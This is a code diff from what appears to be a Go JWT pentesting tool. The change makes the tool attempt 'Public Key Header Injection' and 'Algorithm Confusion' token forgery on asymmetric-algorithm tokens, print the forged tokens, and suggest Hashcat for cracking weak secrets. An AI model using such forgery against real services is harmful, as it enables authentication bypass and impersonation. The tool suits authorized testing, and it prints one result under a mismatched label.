@@ -42,15 +42,25 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 		fmt.Print("You can use Hashcat with the mode 16500 to verify if the JWT is signed with a weak secret\n\n")
 		fmt.Print("------------------------------------------------------\n\n")
 
-		//Check if the algo used is an asymmetric algorithm, which can possibly e exploited through algorithm confusion
-		if publicKey != "" && alg != "HS256" && alg != "HS384" && alg != "HS512" {
-			fmt.Print("Checking if the token is vulnerable to the \"Algorithm Confusion\" attack\n\n")
-			newJWTStr := ExploitAlgoConfusion(token, userHeader, userValue, publicKey)
+		//Check if the algo used is an asymmetric algorithm, which can possibly lead to "Algorithm Confusion" and "Public Key Header Injection" attacks
+		algStr := alg.(string)
+		if algStr != "HS256" && algStr != "HS384" && algStr != "HS512" {
+			fmt.Print("Checking if the token is vulnerable to the \"Public Key Header Injection\" attack\n\n")
+			newJWTStr = ExploitPublicKeyInjection(token, userHeader, userValue, algStr)
 			if newJWTStr != "" {
 				fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
 			}
 			fmt.Print("------------------------------------------------------\n\n")
 
+			//If a file with a public key has been given, generate a token
+			if publicKey != "" {
+				fmt.Print("Checking if the token is vulnerable to the \"Algorithm Confusion\" attack\n\n")
+				newJWTStr := ExploitAlgoConfusion(token, userHeader, userValue, algStr, publicKey)
+				if newJWTStr != "" {
+					fmt.Printf("Algorithm Confusion : %s\n\n", newJWTStr)
+					fmt.Print("------------------------------------------------------\n\n")
+				}
+			}
 		}
 	}
 
